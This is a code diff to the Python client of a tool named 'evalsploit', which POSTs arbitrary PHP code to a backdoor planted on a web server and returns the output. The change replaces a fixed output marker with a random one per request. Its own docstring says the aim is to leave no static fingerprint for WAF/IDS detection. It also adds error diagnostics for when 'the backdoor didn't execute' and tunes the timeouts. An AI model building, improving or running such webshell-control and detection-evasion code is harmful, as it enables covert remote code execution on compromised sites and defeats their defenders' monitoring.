@@ -3,6 +3,7 @@
 from __future__ import annotations
 
 import base64
+import secrets
 import time
 from os import urandom
 from typing import TYPE_CHECKING
@@ -18,15 +19,17 @@ import urllib3
 urllib3.disable_warnings()
 
 
-MARKER = "SPLITLINE_SPLITLINE_SPLITLINE"
-
-
-def send(ctx: "SessionContext", php_code: str, timeout: int = 1000) -> str:
+def send(ctx: "SessionContext", php_code: str, timeout: int | None = 30) -> str:
     """
-    Prepend marker to payload, encode per send_mode, POST, return only our output.
-    Ignores all server output before the marker (works from any active place in infected file).
+    Prepend a per-request random marker to payload, encode per send_mode, POST,
+    return only our output.  The random marker changes every call — no static
+    fingerprint for WAF/IDS detection.
     """
-    payload = f'echo "aaa {MARKER}";' + php_code
+    marker = secrets.token_hex(8)          # 16 hex chars, unique per request
+    payload = (
+        f'echo "{marker}";'
+        f'try{{{php_code}}}catch(\\Throwable $e){{echo "[PHP_ERR:".$e->getMessage()."]";}}'
+    )
     mode = ctx.config.send_mode
     z_key = ctx.config.Z
     v_key = ctx.config.V
@@ -47,12 +50,11 @@ def send(ctx: "SessionContext", php_code: str, timeout: int = 1000) -> str:
                 verify=False,
                 timeout=timeout,
             )
-            return _extract(r.text)
+            return _extract(r.text, marker)
         except (RequestException, Timeout) as e:
             return f"[evalsploit error] {e!s}"
 
     if mode == "classic":
-        # Server expects base64 in Z
         encoded = base64.b64encode(payload.encode("utf-8")).decode("utf-8")
         try:
             r = requests.post(
@@ -63,11 +65,11 @@ def send(ctx: "SessionContext", php_code: str, timeout: int = 1000) -> str:
                 verify=False,
                 timeout=timeout,
             )
-            return _extract(r.text)
+            return _extract(r.text, marker)
         except (RequestException, Timeout) as e:
             return f"[evalsploit error] {e!s}"
 
-    # simple: no parsing, return full body (for debugging)
+    # simple: raw eval, still extract by marker
     try:
         r = requests.post(
             ctx.url,
@@ -77,7 +79,7 @@ def send(ctx: "SessionContext", php_code: str, timeout: int = 1000) -> str:
             verify=False,
             timeout=timeout,
         )
-        return r.text
+        return _extract(r.text, marker)
     except (RequestException, Timeout) as e:
         return f"[evalsploit error] {e!s}"
 
@@ -106,18 +108,22 @@ def validate_proxy(proxy_str: str, test_url: str | None = None, timeout: int = 1
         return False
 
 
-def _extract(body: str) -> str:
-    """Return only output after marker; ignore everything before."""
-    idx = body.find(MARKER)
+def _extract(body: str, marker: str) -> str:
+    """Return only output after marker.
+    If marker is absent the backdoor didn't execute — return a diagnostic string."""
+    idx = body.find(marker)
     if idx == -1:
-        return body
-    return body[idx + len(MARKER) :].lstrip()
+        body_lower = body.lower()
+        if any(tag in body_lower for tag in ("fatal error", "parse error", "warning:", "notice:")):
+            return f"[evalsploit: PHP error]\n{body.strip()[:400]}"
+        return "[evalsploit: backdoor not triggered — check URL / Z / V]"
+    return body[idx + len(marker):].lstrip()
 
 
 SEND_MODES = ("bypass", "classic", "simple")
 
 
-def ping_with_mode(ctx: "SessionContext", mode: str, timeout: int = 1000) -> tuple[bool, int]:
+def ping_with_mode(ctx: "SessionContext", mode: str, timeout: int = 30) -> tuple[bool, int]:
     """
     Try ping (echo 1;) with the given send_mode. Sets ctx.config.send_mode = mode.
     Returns (success, ms). On success, ctx.config.send_mode is left as mode.
@@ -126,12 +132,7 @@ def ping_with_mode(ctx: "SessionContext", mode: str, timeout: int = 1000) -> tup
     t0 = time.perf_counter()
     out = send(ctx, "echo 1;", timeout=timeout)
     ms = round((time.perf_counter() - t0) * 1000)
-    if "[evalsploit error]" in out:
+    if out.startswith("[evalsploit"):
         return False, ms
-    if mode == "simple":
-        idx = out.find(MARKER)
-        after = out[idx + len(MARKER) :].lstrip() if idx >= 0 else ""
-        ok = "1" in after or after.strip() == "1"
-    else:
-        ok = out.strip() == "1"
+    ok = out.strip() == "1"
     return ok, ms
